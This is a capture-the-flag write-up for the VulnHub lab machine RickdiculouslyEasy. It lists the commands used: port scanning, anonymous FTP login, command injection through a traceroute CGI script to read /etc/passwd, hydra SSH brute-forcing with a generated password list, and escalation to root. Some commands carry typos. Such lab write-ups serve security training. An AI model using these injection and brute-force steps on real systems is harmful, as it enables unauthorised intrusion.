# Rickdiculouslyeasy: 1
## Writeup for the RICKDICULOUSLYEASY: 1

Downloadlink : 
https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/

*130 points of flas and root access*

1) Locate vulnerable machine IP address by using *netdiscover*  **Ip : 192.168.23.133** (^ip address will be diffrent on your machine) 
2) Scan for open ports using *NMAP.* **nmap -sV -p- -v 192.168.23.133**

**-nmap results-**
Nmap scan report for 192.168.18.29

Host is up (0.00015s latency).

Not shown: 65528 closed ports

PORT      STATE SERVICE VERSION

21/tcp    open  ftp     vsftpd 3.0.3

22/tcp    open  ssh?

80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))

9090/tcp  open  http    Cockpit web service 161 or earlier

13337/tcp open  unknown

22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)

60000/tcp open  unknown

Did a scan on the ftp server to get more info. ftp server can be accessed anonymous.

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt

|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub

ftp 192.168.18.29 Login: anonymous password: *create a password*

get FLAG.txt 

cat file to get the flag

:pirate_flag: FLAG{Whoa this is unexpected} - 10 Points

use dirb tool to scan 

found http: //192.168.18.29/passwords/

click on the flag file

:pirate_flag: FLAG{Yeah d- just don't do it.} - 10 Points

click the passwords.html and inspect to find a potential password = winter

enter the url http: //192.168.18.29/9090 to get the next flag

:pirate_flag: FLAG {There is no Zeus, in your face!} - 10 Points

use netcat again on port 60000 to get a reverse shell and cat the FLAG.txt

:pirate_flag: FLAG{Flip the pickle Morty!} - 10 Points 

use netcat to enter port 13337 (nc 192.16.29 13337) to get a flag

:pirate_flag: FLAG:{TheyFoundMyBackDoorMorty}-10Points

From the dirb tool we found http: //192.168.18.29/robots.txt

Which gave us 3 links:

/cgi-bin/root_shell.cgi -Not working-

/cgi-bin/tracertool.cgi

/cgi-bin/*

/cgi-bin/tracertool.cgi enables a trace route tool. Use the url to inject less ; less /etc/passwd/ to get a list of users

Following list of users were found:

RickSanchez:x :1000:1000::/home/RickSanchez:/bin/bash

Morty:x :1001:1001::/home/Morty:/bin/bash

Summer:x :1002:1002::/home/Summer:/bin/bash

create a user.txt file with RickSanchez , Morty , Summer 

use hydra tool to crack the password by connecting via ssh = hydra -L user.txt -p winter -s 22222 192.168.18.29 ssh 

[22222][ssh] host: 192.168.18.29   login: Summer   password: winter

connect to ssh = ssh -p 22222 Summer@192.168.18.29

 less FLAG.txt

:pirate_flag: FLAG{Get off the high road Summer!} - 10 Points

Explore /home to find other users

cd to Morty and download the jpg file into local machine = cp -P 22222 Summer@192.168.18.29:/home/Morty/Safe_Password.jpg picture.jpg  

use the strings tool and grep to get clues = strings picture.jpg | grep word
                                                           127 ⨯
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek

download the zip file to local machine = scp -P 22222 Summer@192.168.18.29:/home/Morty/journal.txt.zip test.zip

cat unzipped file to get flag

:pirate_flag: FLAG: {131333} - 20 Points

cd to RickSanchez and move the safe exe file Summer diretory 

excute ./safe 

Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!

try the previous flags numbers as arguments 

flag unlocked

:pirate_flag: FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

found some clues for the next flag:

1 uppercase character

1 digit

One of the words in my old bands name.

Use google search to find Rick Sanchez band = The Flesh Curtains

Write a python scrip to generate a password list with clues: 

import string

words = ['The', 'Flesh', 'Curtains']

for i in string.ascii_uppercase:

    for j in string.digits:

        for k in words:

            print('{0}{1}{2}'.format(i, j, k))

Create a text file with generated password

use hydra to crack password = hydra -l RickSanchez -P passwordlist.txt -T4 -s 22222 192.168.18.29 ssh

enter RickSnachez user and sudo su to gain access to root

cd to root folder and cat file for final flag

:pirate_flag: FLAG: {Ionic Defibrillator} - 30 points




